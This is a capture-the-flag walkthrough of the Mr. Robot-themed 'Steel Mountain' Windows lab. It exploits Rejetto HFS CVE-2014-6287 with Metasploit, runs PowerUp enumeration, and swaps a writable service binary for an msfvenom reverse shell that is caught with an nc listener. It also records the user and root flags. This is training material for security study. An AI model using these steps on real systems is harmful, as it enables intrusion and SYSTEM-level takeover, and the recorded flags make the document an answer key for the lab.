# Steel_Mountain

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

![Introduction](/steel_mountain.png)

Who is the employee of the month?

    Bill Harper

![Inspect](/BillHarper.png)

## Initial Access

Scan the machine with nmap. What is the other port running a web server on?

    8080

![nmap scan](/nmap.png)

Take a look at the other web server. What file server is running?

    Rejetto HTTP File Server

Visit http://ip:8080  # Replacing ip with your machine ip address

![fileserver scan](/fileserver.png)

What is the CVE number to exploit this file server?

    2014-6287

![exploit db](/exploit_db.png)

Use Metasploit to get an initial shell. What is the user flag?

    b04763b6fcf51fcd7c13abc7db4fd365

![metasploit](/metaploit.png)
![metasploit](/metasploit.png)


## Privilege Escalation

Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."

You can download the script here. Now you can use the upload command in Metasploit to upload the script.

    upload /PowerUp.ps1

![PowerUP](/PowerUp.png)


Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?


    PS > .\PowerUp.ps1
    PS > Invoke-AllCHecks

    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths

    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths

    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                    Permissions=System.Object[]}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths

    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                    IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths

    ServiceName    : AWSLiteAgent
    Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
    CanRestart     : False
    Name           : AWSLiteAgent
    Check          : Unquoted Service Paths

    ServiceName    : AWSLiteAgent
    Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
    CanRestart     : False
    Name           : AWSLiteAgent
    Check          : Unquoted Service Paths

    ServiceName    : IObitUnSvr
    Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
    CanRestart     : False
    Name           : IObitUnSvr
    Check          : Unquoted Service Paths

    ServiceName    : IObitUnSvr
    Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
    CanRestart     : False
    Name           : IObitUnSvr
    Check          : Unquoted Service Paths

    ServiceName    : IObitUnSvr
    Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                    Permissions=System.Object[]}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
    CanRestart     : False
    Name           : IObitUnSvr
    Check          : Unquoted Service Paths

    ServiceName    : IObitUnSvr
    Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe;
                    IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path <HijackPath>
    CanRestart     : False
    Name           : IObitUnSvr
    Check          : Unquoted Service Paths

    ServiceName    : LiveUpdateSvc
    Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
    CanRestart     : False
    Name           : LiveUpdateSvc
    Check          : Unquoted Service Paths

    ServiceName    : LiveUpdateSvc
    Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
    CanRestart     : False
    Name           : LiveUpdateSvc
    Check          : Unquoted Service Paths

    ServiceName    : LiveUpdateSvc
    Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
    ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                    IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path <HijackPath>
    CanRestart     : False
    Name           : LiveUpdateSvc
    Check          : Unquoted Service Paths

    ServiceName                     : AdvancedSystemCareService9
    Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
    ModifiableFileIdentityReference : STEELMOUNTAIN\bill
    StartName                       : LocalSystem
    AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
    CanRestart                      : True
    Name                            : AdvancedSystemCareService9
    Check                           : Modifiable Service Files

    ServiceName                     : IObitUnSvr
    Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
    ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
    ModifiableFileIdentityReference : STEELMOUNTAIN\bill
    StartName                       : LocalSystem
    AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
    CanRestart                      : False
    Name                            : IObitUnSvr
    Check                           : Modifiable Service Files

    ServiceName                     : LiveUpdateSvc
    Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
    ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
    ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
    ModifiableFileIdentityReference : STEELMOUNTAIN\bill
    StartName                       : LocalSystem
    AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
    CanRestart                      : False
    Name                            : LiveUpdateSvc
    Check                           : Modifiable Service Files


Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?

    AdvancedSystemCareService9

The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

Use msfvenom to generate a reverse shell as an Windows executable.

![msfvenom](/msfvenom.png)

Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.


    meterpreter > shell
    Process 1812 created.
    Channel 14 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd "C:\Program Files (x86)\IObit\"
    cd "C:\Program Files (x86)\IObit\"

    C:\Program Files (x86)\IObit>dir
    dir
    Volume in drive C has no label.
    Volume Serial Number is 2E4A-906A

    Directory of C:\Program Files (x86)\IObit

    11/18/2020  11:30 AM    <DIR>          .
    11/18/2020  11:30 AM    <DIR>          ..
    11/18/2020  11:24 AM    <DIR>          Advanced SystemCare
    11/18/2020  11:29 AM             7,168 Advanced.exe
    09/26/2019  09:35 PM    <DIR>          IObit Uninstaller
    09/26/2019  07:18 AM    <DIR>          LiveUpdate
                1 File(s)          7,168 bytes
                5 Dir(s)  44,169,838,592 bytes free

    C:\Program Files (x86)\IObit>sc qc AdvancedSystemCareService9
    sc qc AdvancedSystemCareService9
    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: AdvancedSystemCareService9
            TYPE               : 110  WIN32_OWN_PROCESS (interactive)
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
            LOAD_ORDER_GROUP   : System Reserved
            TAG                : 1
            DISPLAY_NAME       : Advanced SystemCare Service 9
            DEPENDENCIES       :
            SERVICE_START_NAME : LocalSystem

    C:\Program Files (x86)\IObit>sc query AdvancedSystemCareService9
    sc query AdvancedSystemCareService9

    SERVICE_NAME: AdvancedSystemCareService9
            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
            STATE              : 4  RUNNING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0

    C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
    sc stop AdvancedSystemCareService9

    SERVICE_NAME: AdvancedSystemCareService9
            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
            STATE              : 4  RUNNING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0

    C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
    sc start AdvancedSystemCareService9
    [SC] StartService FAILED 1053:

    The service did not respond to the start or control request in a timely fashion.


    C:\Program Files (x86)\IObit>


What is the root flag?

    kali@kali:~/Hacking$ nc -lnvp 9002
    Listening on 0.0.0.0 9002
    Connection received on 10.10.208.51 49299
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Windows\system32>type "C:\Users\Administrator\Desktop\root.txt
    type "C:\Users\Administrator\Desktop\root.txt
    9af5f314f57607c00fd09803a587db80

    9af5f314f57607c00fd09803a587db80
